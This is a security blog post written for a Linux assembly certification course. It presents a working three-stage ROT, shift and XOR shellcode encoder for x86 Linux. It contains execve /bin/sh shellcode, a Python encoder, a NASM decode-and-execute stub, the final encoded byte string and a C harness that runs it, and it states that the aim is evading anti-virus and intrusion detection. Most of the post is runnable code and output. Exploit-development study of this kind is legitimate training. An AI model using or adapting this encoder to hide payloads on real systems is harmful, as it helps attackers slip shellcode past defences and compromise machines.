---
layout: single
title: [ Rot-n + Shift-n + Xor-n] Shellcode Encoder - Linux x86
date: 2018-1-22
classes: wide
header:

---

Introduction
------------
According to English dictionary, encode is converting something, such as a body of information from one system of communications to another; especially: to convert a message into code. This blog post will combine three basic encoding operations (more on that later) to encode sample shellcode and then decode/execute it to demonstrate the concept.

Encoder
-------
In this section, we’ll create 3-phase encoder that takes one byte of given shellcode at a time, mangle it and then produce an encoded word (2 bytes). The following will describe what each phase will do. Phase I (ROT-N), in this phase we add number N to shellcode byte. Phase II (Shift-N), in this phase we shift `stdout` from phase one to left by N. Phase III (XOR-N), here we just XOR `stdou`t from phase two to get the final encoded word. Before we start working on the encoder, let’s write shellcode that spawn shell to test with.

```nasm
global _start			

section .text

_start:
    ;
    ; execve() code block
    ;
    xor eax,eax       ; initiliaze EAX
    push eax          ; push null terminator
    push 0x68732f2f   ; push /bin//sh
    push 0x6e69622f
    xchg ebx,esp      ; save stack pointer to EBX
    mov al,0xb        ; __NR_execve 11
    int 0x80          ; ping kernel!
```

Let’s compile `execve()` code block and then dump shellcode.

```sh
ihack4falafel@ubuntu:~$ nasm -f elf32 -o sh.o sh.nasm 
ihack4falafel@ubuntu:~$ ld -z execstack -o sh sh.o
ihack4falafel@ubuntu:~$ objdump -d ./sh|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xdc\xb0\x0b\xcd\x80"
ihack4falafel@ubuntu:~$ 
```

We’ll create python script that takes ROT, Shift, and XOR as user input and print original and encoded shellcode, please note you still need to update the shellcode inside the script to your liking. For this post, we’ll use the one created earlier.  It’s worth noting that the script shift operation number can only be anything between 1 and 8 bits due to `encoded_shellcode` size (word) in the decoder. Also, we’ve added XOR input value to the end of the encoded shellcode as terminator, so if XOR operation in the decoder results in zero that means hey stop decoding.

```python
#!/usr/bin/python
#---------------------------------------------------------------------------------------------#
# Script        = Encoder.py                                                                  #
# SLAE-ID       = SLAE-1115                                                                   #
# Description   = [ROT-N + SHL-N + XOR-N] Encoder                                             #
# Date          = 1/19/2018                                                                   #
# Author        = @ihack4falafel                                                              #
# Usage         = python Encoder.py <ROT number> <number of bits to shift> <XOR number>       #
#---------------------------------------------------------------------------------------------#

import sys

# Colors 
#---------------#---------#
W  = '\033[0m'  # White   #
P  = '\033[35m' # Purple  #
Y  = '\033[33m' # Yellow  #
#---------------#---------#

# Check ROT, SHL, and XOR input, otherwise print usage, example, and important notes!
if len(sys.argv) < 4:
  print Y+ "Usage               :" + P+  " python Encoder.py <ROT number> <number of bits to shift> <XOR number>  " +W
  print Y+ "Example             :" + P+  " python Encoder.py 13 1 1337                                            " +W
  print Y+ "Notes               :" + P+  " 1) Make sure to update Decoder.nasm with input values.                 " +W
  print    "                     " + P+  " 2) Due to encoded_shellcode size (word) in Decoder.nasm, shift operatio" +W
  print    "                     " + P+  "    n is limited to <1-8> bits. Feel free to upgrade size to DW to allow" +W
  print    "                     " + P+  "    up to 16-bits shift operation.                                      " +W
  print    "                     " + P+  " 3) Encoder.py currently include /bin/sh shellcode as proof of concept. " +W
  print    "                     " + P+  "    Make sure to change it to your desired shellcode.                   " +W
  sys.exit(0)

ROT     = int(sys.argv[1])
nbits   = int(sys.argv[2])
XOR     = int(sys.argv[3])

# initial values   
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xdc\xb0\x0b\xcd\x80")           # paste your shellcode here
XOR_HEX = hex(XOR)                                                                                     # Encoded shellcode terminator     
encoded_shellcode  = "" 
original_shellcode = ""

# Orginal shellcode formatted
for x in bytearray(shellcode):
  original_shellcode += '0x'
  original_shellcode += '%02x, ' %x

# [ROT-N + SHL-N + XOR-N] encoded shellcode formatted   
for y in bytearray(shellcode):  
  byte = (y + ROT)%256                                                                                  #|-->ROT-N               
  byte = byte << nbits                                                                                  #########|-->SHL-N
  byte = byte ^ XOR                                                                                     #################|-->XOR-N	                                                                                  
  encoded_shellcode += '0x'
  encoded_shellcode += '%02x, ' %byte

# print original and encoded shellcode
print Y+ "Original Shellcode: " + P+ original_shellcode              +W
print Y+ "Encoded Shellcode : " + P+ encoded_shellcode  + Y+ XOR_HEX +W
```

Generate encoded shellcode.

```sh
ihack4falafel@ubuntu:~$ python Encoder.py 13 1 1337
Original Shellcode: 0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x87, 0xdc, 0xb0, 0x0b, 0xcd, 0x80, 
Encoded Shellcode : 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539
ihack4falafel@ubuntu:~$
```

Decoder
-------
Now comes the decoding part, let’s write code that basically takes encoded shellcode produced earlier , decode it in reverse order and then execute.

```nasm
global _start

section .text

_start:
    ;
    ; [ROT-N + SHL-N + XOR-N] encoded execve() code block
    ;
    jmp short call_decoder       ; jump to call_decoder to save encoded_shellcode pointer to ESI
	
decoder:

    pop esi                      ; store encoded_shellcode pointer in ESI
    push esi                     ; push encoded_shellcode pointer to stack for later execution
    mov edi, esi                 ; move encoded_shellcode pointer to EDI

decode:
    ;
    ; note: 1) Make sure ROT, SHR, and XOR here match your encoder.py input.
    ;       2) Hence we're limited by the size of encoded_shellcode (word),
    ;          SHR is limited to <1-8> bits. Feel free to upgrade size to DW 
    ;          to allow up to 16-bits shift if need be.
    ;
    mov ax, [esi]                ; move current word from encoded_shellcode to AX
    xor ax, 0x539                ; XOR encoded_shellcode with 1337, one word at a time  
    jz decoded_shellcode         ; if zero jump to decoded_shellcode
    shr ax, 1                    ; shift encoded_shellcode to right by one bit, one word at a time	
    sub ax, 13                   ; substract 13 from encoded_shellcode, one word at a time
    mov [edi], al                ; move decoded byte to EDI	
    inc esi                      ; point to the next encoded_shellcode word
    inc esi
    inc edi                      ; point to the next decoded_shellcode byte
    jmp short decode             ; jump to decode and repeat the decoding process for the next word!

decoded_shellcode:
    call [esp]                   ; execute decoded_shellcode

call_decoder:
    call decoder
    encoded_shellcode: dw 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539
```

Compile and dump shellcode.

```sh
ihack4falafel@ubuntu:~# nasm -f elf32 -o Decoder.o Decoder.nasm 
ihack4falafel@ubuntu:~# ld -z execstack -o Decoder Decoder.o
ihack4falafel@ubuntu:~# objdump -d ./Decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xeb\x1e\x5e\x56\x89\xf7\x66\x8b\x06\x66\x35\x39\x05\x74\x0e\x66\xd1\xe8\x66\x83\xe8\x0d\x88\x07\x46\x46\x47\xeb\xe9\xff\x14\x24\xe8\xdd\xff\xff\xff\x45\x05\xa3\x04\x83\x05\xd3\x05\x41\x05\x41\x05\x39\x04\xd3\x05\xd3\x05\x41\x05\xe7\x05\xd5\x05\xcf\x05\x11\x04\xeb\x04\x43\x04\x09\x05\x8d\x04\x23\x04\x39\x05"
ihack4falafel@ubuntu:~#
```

Add it to final exploit.

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x1e\x5e\x56\x89\xf7\x66\x8b\x06\x66\x35\x39\x05\x74\x0e\x66\xd1\xe8\x66\x83\xe8\x0d\x88\x07\x46\x46\x47\xeb\xe9\xff\x14\x24\xe8\xdd\xff\xff\xff\x45\x05\xa3\x04\x83\x05\xd3\x05\x41\x05\x41\x05\x39\x04\xd3\x05\xd3\x05\x41\x05\xe7\x05\xd5\x05\xcf\x05\x11\x04\xeb\x04\x43\x04\x09\x05\x8d\x04\x23\x04\x39\x05";

void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

Demo time


[![Encoder/Decoder Demo](https://github.com/ihack4falafel/ihack4falafel.github.io/blob/master/assets/images/chmod.png)](https://player.vimeo.com/video/252202488?dnt=1&app_id=122963 "Click to Watch!")

Closing Thoughts
----------------
I believe learning shellcode encoding is essential to exploit development, in order to evade modern anti-viruses and/or intrusion detection/prevention systems. Please note all of the code in this post were tested on Ubuntu 12.04.5 LTS. Feel free to contact me for questions via twitter [@ihack4falafel](https://twitter.com/ihack4falafel).

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1115

Github Repo: [https://github.com/ihack4falafel/SLAE32/tree/master/Assignment%204](https://github.com/ihack4falafel/SLAE32/tree/master/Assignment%204)
